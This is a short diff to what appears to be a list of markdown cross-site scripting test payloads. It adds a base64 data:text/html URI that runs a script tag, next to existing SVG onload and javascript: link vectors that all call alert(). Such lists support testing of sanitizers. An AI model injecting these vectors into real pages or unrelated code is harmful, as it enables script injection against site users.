@@ -35,6 +35,7 @@
 ![a](data:image/svg+xml,<svg/onload=alert(1)>)
 ![a](data:image/svg+xml,<svg/onload="alert(1)">)
 ![a](data:image/svg+xml;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+)
+![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
 ![a](data:image/svg+xml,<svg><script>alert(1)</script></svg>)
 ![a](javascript&#x3A;alert(1))
 ![a](javascript:alert`1`)
